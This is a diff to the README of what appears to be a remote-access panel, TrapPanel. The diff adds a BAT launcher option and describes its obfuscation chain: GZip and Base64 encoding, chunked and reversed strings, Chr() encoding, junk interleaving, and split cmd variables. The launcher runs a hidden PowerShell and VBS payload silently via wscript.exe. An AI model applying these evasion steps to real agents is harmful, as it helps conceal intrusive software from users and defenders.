@@ -60,6 +60,7 @@ Configure and generate deployment-ready agents from the Builder tab.
 | Silent Mode | Run agent without console or visible window |
 | Generate PS1 | Produce a lightweight PowerShell script agent |
 | Generate VBS | Produce an obfuscated VBS launcher wrapping the compressed PS1 payload — GZip → Base64 → chunked & reversed → Chr()-encoded strings → junk interleaving |
+| Generate BAT | Produce a batch file embedding the VBS launcher — obfuscated via UTF-16 BOM, split cmd vars, junk interleave, payload chunked into env vars, PowerShell decodes and writes .vbs then runs silently via wscript.exe |
 | Compile EXE | Roslyn-compile a standalone .NET Framework 4.7.2 executable |
 
 ## Transport Protocol
@@ -148,7 +149,7 @@ Run the generated executable from `bin\Release\net8.0-windows7.0\TrapPanel.exe`.
 2. **Set password** — navigate to Settings, set a server password (minimum 12 characters)
 3. **Start listening** — click "Start Listening" to begin accepting client connections
 4. **Configure builder** — enter server IP, port, and password in the Builder tab
-5. **Generate agent** — click "Generate PS1", "Generate VBS", or "Compile EXE"
+5. **Generate agent** — click "Generate PS1", "Generate VBS", "Generate BAT" (silent VBS-in-BAT), or "Compile EXE"
 6. **Deploy** — run the generated agent on the target machine
 7. **Manage** — connected clients appear in the Clients tab; right-click to launch plugins
 8. **Network info** — view public IP, local IPs, gateway, DNS, and adapter details in the Network tab
